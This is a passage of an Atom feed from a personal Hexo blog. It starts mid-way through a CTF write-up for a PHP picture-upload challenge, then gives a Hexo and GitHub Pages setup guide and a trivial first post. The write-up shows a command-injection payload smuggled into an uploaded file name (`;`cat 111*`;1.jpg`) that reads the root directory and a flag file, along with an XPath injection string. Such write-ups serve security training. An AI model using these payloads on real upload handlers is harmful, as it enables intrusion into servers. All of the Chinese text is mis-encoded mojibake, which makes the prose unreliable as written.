é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">          <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>åˆ†ææºç ï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ ç™½åå•ï¼ˆjpg|jpeg|gif|png|bmpåç¼€åï¼‰</p><p>ç»§ç»­åˆ†æï¼Œå‘ç°class FILEçš„<code>system(&quot;ls -all &quot; . $this-&gt;filename);</code>å¤„å­˜åœ¨å‘½ä»¤æ‹¼æ¥</p><p>ä½†æ˜¯æœ‰æ¡ä»¶ï¼Œå¿…é¡»ä¿è¯æ–‡ä»¶åæœ‰ä¸”åªæœ‰ä¸€ä¸ª<code>.</code>ï¼Œå¹¶ä¸”ä¸èƒ½å«æœ‰<code>\/</code></p><p>æ¥ä¸‹æ¥æƒ³æ–¹æ³•ç»•è¿‡</p><p>é¦–å…ˆä¸Šä¼ æ–‡ä»¶1111.jpgï¼Œæ–‡ä»¶å†…å®¹ä¸º<code>ls /</code>ç”¨æ¥æŸ¥çœ‹æ ¹ç›®å½•flagæ–‡ä»¶å</p><p>æ¥ä¸‹æ¥ä¸Šä¼ åä¸º<code>;`cat 111*`;1.jpg</code>çš„æ–‡ä»¶å†è¿›è¡Œ<code>?filename=;`cat 111*`;1.jpg&amp;todo=show</code>ï¼Œå‘ç°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œè¿”å›å¾—åˆ°flagè·¯å¾„<code>adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code></p><p>æœ€åæ›´æ¢æ–‡ä»¶å†…å®¹ä¸º<code>cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd</code>ï¼Œå†æ¬¡æ‰§è¡Œå‘½ä»¤å¾—åˆ°flag</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="xpathæ³¨å…¥"><a href="#xpathæ³¨å…¥" class="headerlink" title="xpathæ³¨å…¥"></a>xpathæ³¨å…¥</h3><p>é¢˜ç›®ä¸­xpathæŸ¥è¯¢è¯­å¥æ‹¼æ¥åä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/user[username=&#x27;admin&#x27;&#x27; and password=&#x27;&#x27;]|//*|//*[&#x27;&#x27;]</span><br></pre></td></tr></table></figure><p>å…¶å®åé¢ä¸é‡è¦ï¼Œå› ä¸ºadminçš„å¼•å·å·²ç»å°†æŸ¥è¯¢è¯­å¥é—­åˆäº†</p><p>ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/accounts/user[username=&#x27;admin&#x27;]</span><br></pre></td></tr></table></figure><p>äºæ˜¯ç›¸å½“äºæŸ¥è¯¢æ˜¯å¦æœ‰adminè´¦æˆ·ï¼Œå¾—åˆ°ç»“æœ</p><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p><code>;</code>å¯ä»¥åˆ†éš”ä¸€ä¸²å‘½ä»¤</p><p><code>`</code>Linuxä¸­åå¼•å·çš„ä½œç”¨æ˜¯åœ¨å°†åå¼•å·å†…çš„å‘½ä»¤å¤„ç†å®Œæ¯•ä¹‹åï¼Œä¼šå°†è¿”å›çš„ä¿¡æ¯ä¼ ç»™åå¼•å·çš„ä½ç½®ï¼Œå†æ¬¡æ‰§è¡Œå‘½ä»¤</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>çœ‹äº†ç½‘ä¸Šå¥½å¤šwpï¼Œå‘ç°æˆ‘çš„åšæ³•è²Œä¼¼æ˜¯éé¢„æœŸ</p><p>é¢„æœŸè§£æ˜¯md5_fileå‡½æ•°ç»“åˆpharæ‰“çš„</p><p>å¤ªèœäº†å¤ªèœäº†ï¼Œåˆ«çš„é¢˜ç›®ä¸ºä»€ä¹ˆä¸å†™wpï¼Œå› ä¸ºéƒ½ä¸ä¼šã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;è¿‡ç¨‹&quot;&gt;&lt;/a&gt;è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;å¼€å¯å®¹å™¨ï¼Œå‘ç°ä»¥ä¸‹è¡¨å•ï¼Œè¡¨å•ä¿¡æ¯é€šè¿‡postæ–¹æ³•ä¼ é€&lt;/p&gt;
&lt;img src=&quot;/2023/07/27/2023dasctf_MyPicD</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://blog.lazyforever.top/categories/WriteUp/"/>
    
    
    <category term="xpathæ³¨å…¥" scheme="https://blog.lazyforever.top/tags/xpath%E6%B3%A8%E5%85%A5/"/>
    
    <category term="rce" scheme="https://blog.lazyforever.top/tags/rce/"/>
    
    <category term="php" scheme="https://blog.lazyforever.top/tags/php/"/>
    
    <category term="web" scheme="https://blog.lazyforever.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨hexoæ¡†æ¶æ­å»ºgithubé™æ€åšå®¢</title>
    <link href="https://blog.lazyforever.top/2023/06/30/hexo/"/>
    <id>https://blog.lazyforever.top/2023/06/30/hexo/</id>
    <published>2023-06-30T07:26:57.000Z</published>
    <updated>2023-06-30T08:41:41.280Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡ä½¿ç”¨ hexo æ­å»ºé™æ€ç½‘ç«™ï¼Œè¸©äº†å¥½å¤šå‘ï¼Œç«‹æ­¤è´´è®°å½•ä¸€ä¸‹</p><h2 id="æœ¬åœ°é…ç½®Hexo"><a href="#æœ¬åœ°é…ç½®Hexo" class="headerlink" title="æœ¬åœ°é…ç½®Hexo"></a>æœ¬åœ°é…ç½®Hexo</h2><h3 id="å®‰è£…Nodejs"><a href="#å®‰è£…Nodejs" class="headerlink" title="å®‰è£…Nodejs"></a>å®‰è£…Nodejs</h3><p><a href="https://nodejs.org/zh-cn">Nodejså®˜æ–¹åœ°å€</a></p><p>ä»ä»¥ä¸Šé“¾æ¥ä¸‹è½½ nodejs å®‰è£…ï¼ˆå®˜ç½‘ä¸‹è½½ç¨æ…¢ï¼Œå»ºè®®ç¿»å¢™ï¼‰</p><h3 id="è®¾ç½®npmæ·˜å®é•œåƒç«™"><a href="#è®¾ç½®npmæ·˜å®é•œåƒç«™" class="headerlink" title="è®¾ç½®npmæ·˜å®é•œåƒç«™"></a>è®¾ç½®npmæ·˜å®é•œåƒç«™</h3><p>npm é»˜è®¤çš„æºçš„ä¸‹è½½é€Ÿåº¦å¯èƒ½å¾ˆæ…¢ï¼Œå»ºè®®ä½¿ç”¨æ·˜å®é•œåƒæ›¿æ¢ã€‚æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå°† npm çš„æºè®¾ç½®æˆæ·˜å®é•œåƒç«™ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry &quot;https://registry.npm.taobao.org&quot;</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h3><p><a href="https://git-scm.com/downloads/">gitå®˜æ–¹é“¾æ¥</a></p><p>ä»ä»¥ä¸Šé“¾æ¥ä¸‹è½½ git å®‰è£…</p><p>ä¸€è·¯ç¡®è®¤ï¼Œå®‰è£…æ—¶è¦å‹¾é€‰ <strong>Add to PATH</strong> é€‰é¡¹</p><h3 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h3><p>cmd è¾“å…¥ä»¥ä¸‹å‘½ä»¤è§‚å¯Ÿæ˜¯å¦æ‰§è¡Œæ­£ç¡®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br><span class="line">npm -v</span><br></pre></td></tr></table></figure><h3 id="åˆå§‹åŒ–Hexo"><a href="#åˆå§‹åŒ–Hexo" class="headerlink" title="åˆå§‹åŒ–Hexo"></a>åˆå§‹åŒ–Hexo</h3><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… hexo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli g</span><br></pre></td></tr></table></figure><p>åœ¨ç”µè„‘çš„æŸä¸ªç£ç›˜æˆ–è·¯å¾„æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹(åå­—å¯ä»¥éšä¾¿å–)ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯ D:\blogï¼Œç”±äºè¿™ä¸ªæ–‡ä»¶å¤¹å°†æ¥å°±ä½œä¸ºæ‚¨å­˜æ”¾åšå®¢çš„åœ°æ–¹ï¼Œæ‰€ä»¥æœ€å¥½ä¸è¦éšä¾¿æ”¾</p><p>åœ¨ D:\blog æ–‡ä»¶å¤¹ä¸‹å³é”®æ‰“å¼€ Git Bash Hereï¼Œè¾“å…¥å‘½ä»¤: <code>hexo init</code> è¿›è¡Œåˆå§‹åŒ–</p><p>hexo ä¼šè‡ªåŠ¨ä¸‹è½½ä¸€äº›æ–‡ä»¶åˆ°è¿™ä¸ªç›®å½•</p><p>æ¥ç€åœ¨ cmd ä¸­å®‰è£…å…¶ä»– hexo æ’ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-admin --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæœ¬åœ° hexo é…ç½®å®Œæ¯•ã€‚</p><p>ç°åœ¨å¯ä»¥ä½¿ç”¨ hexo æ­å»ºæœ¬åœ°æœåŠ¡å™¨æ¥ä½¿ç”¨</p><p>ä½¿ç”¨ <code>hexo g</code> ç”Ÿæˆé™æ€é¡µé¢ï¼Œä½¿ç”¨ <code>hexo s</code> å¼€å¯æœ¬åœ°æœåŠ¡å™¨ï¼Œæ¥ä¸‹æ¥å¯ä»¥ç”¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ <code>localhost:4000</code> æ¥çœ‹è§åˆšåˆšåˆ›å»ºçš„åšå®¢</p><h2 id="éƒ¨ç½²github"><a href="#éƒ¨ç½²github" class="headerlink" title="éƒ¨ç½²github"></a>éƒ¨ç½²github</h2><h3 id="é…ç½®-Github"><a href="#é…ç½®-Github" class="headerlink" title="é…ç½® Github"></a>é…ç½® Github</h3><p>æ³¨å†Œ github è´¦å·ï¼Œå¹¶åœ¨ä¸»é¡µåˆ›å»ºä»“åº“ï¼Œåå­—ä¸º [yourname].github.io</p><h4 id="é…ç½®ssh"><a href="#é…ç½®ssh" class="headerlink" title="é…ç½®ssh"></a>é…ç½®ssh</h4><p>æ‰“å¼€git bashç»ˆç«¯è®¾ç½® user.name å’Œ user.email</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;ä½ çš„GitHubç”¨æˆ·å&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;ä½ çš„GitHubæ³¨å†Œé‚®ç®±&quot;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆsshå¯†åŒ™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;ä½ çš„GitHubæ³¨å†Œé‚®ç®±&quot;</span></span><br></pre></td></tr></table></figure><p>å°†å…¬åŒ™æ·»åŠ åˆ° github ä¸Š</p><h3 id="å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸Š"><a href="#å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸Š" class="headerlink" title="å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸Š"></a>å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸Š</h3><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ <strong>blog&#x2F;_config.yml</strong>ï¼Œä¿®æ”¹deployé¡¹çš„å†…å®¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE1.png" class=""><p>æ³¨æ„ï¼š</p><ul><li>åˆ†æ”¯ï¼ˆbranchï¼‰è¦ä¸è‡ªå·±åˆ›å»ºä»“åº“çš„åˆ†æ”¯åç§°ä¸€è‡´ï¼ˆæ³¨æ„masterä¸mainçš„åŒºåˆ«ï¼‰</li><li>å†’å·åé¢å¿…é¡»æ·»åŠ ä¸€ä¸ªç©ºæ ¼</li><li>ä¿æŒç¼©è¿›æ ¼å¼ä¸€è‡´</li></ul><p>ç»™å‡ºç¤ºä¾‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">https://github.com/lazy-forever/lazy-forever.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span> </span><br></pre></td></tr></table></figure><h3 id="éƒ¨ç½²hexo"><a href="#éƒ¨ç½²hexo" class="headerlink" title="éƒ¨ç½²hexo"></a>éƒ¨ç½²hexo</h3><p>è¾“å…¥ä¸‹é¢çš„å‘½ä»¤å°†hexoåšå®¢éƒ¨ç½²åˆ°githubä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl  #æ¸…ç†ä¹‹å‰ç”Ÿæˆçš„æ–‡ä»¶</span><br><span class="line">hexo g   #ç”Ÿæˆé™æ€é¡µé¢</span><br><span class="line">hexo d   #éƒ¨ç½²</span><br></pre></td></tr></table></figure><p>éš”ä¸€æ®µæ—¶é—´åæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥ [yourname].github.io å³å¯çœ‹åˆ°æˆ‘ä»¬éƒ¨ç½²çš„åšå®¢</p><h2 id="å…³äºç¿»å¢™"><a href="#å…³äºç¿»å¢™" class="headerlink" title="å…³äºç¿»å¢™"></a>å…³äºç¿»å¢™</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸­å›½å¤§é™†å¢ƒå†…å¯¹äº github çš„è®¿é—®ä¸€ç›´å¤„äºæ—¶å¸¸èƒ½è¿ä¸Šæ—¶å¸¸è¿ä¸ä¸Šçš„çŠ¶æ€ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬åœ¨æ‰§è¡Œ <code>hexo d</code> å‘½ä»¤æ—¶ç¿»å¢™ï¼Œä¼šè®©éƒ¨ç½²çš„è¿‡ç¨‹æ›´åŠ ä¸æ»‘ã€‚</p><p>æˆ‘çš„ç”µè„‘ä¸€ç›´åœ¨ä½¿ç”¨ clash è¿›è¡Œç¿»å¢™ï¼Œè€Œåœ¨ cmd ä¸­ä½¿ç”¨<code>hexo d</code>æ—¶ï¼Œclash å¿…é¡»ç”¨ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å¹¶å¼€å¯å¢å¼ºåŠŸèƒ½ï¼Œå¦‚å›¾ï¼š</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç¬¬ä¸€æ¬¡ä½¿ç”¨ hexo æ­å»ºé™æ€ç½‘ç«™ï¼Œè¸©äº†å¥½å¤šå‘ï¼Œç«‹æ­¤è´´è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;h2 id=&quot;æœ¬åœ°é…ç½®Hexo&quot;&gt;&lt;a href=&quot;#æœ¬åœ°é…ç½®Hexo&quot; class=&quot;headerlink&quot; title=&quot;æœ¬åœ°é…ç½®Hexo&quot;&gt;&lt;/a&gt;æœ¬åœ°é…ç½®Hexo&lt;/h2&gt;&lt;h3 id=&quot;å®‰è£…</summary>
      
    
    
    
    <category term="åšå®¢" scheme="https://blog.lazyforever.top/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="æŠ€æœ¯" scheme="https://blog.lazyforever.top/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>My First Blog</title>
    <link href="https://blog.lazyforever.top/2023/05/29/hello-world/"/>
    <id>https://blog.lazyforever.top/2023/05/29/hello-world/</id>
    <published>2023-05-29T10:00:00.000Z</published>
    <updated>2023-05-31T15:54:21.269Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢ã€‚&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="å…¶ä»–" scheme="https://blog.lazyforever.top/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
</feed>
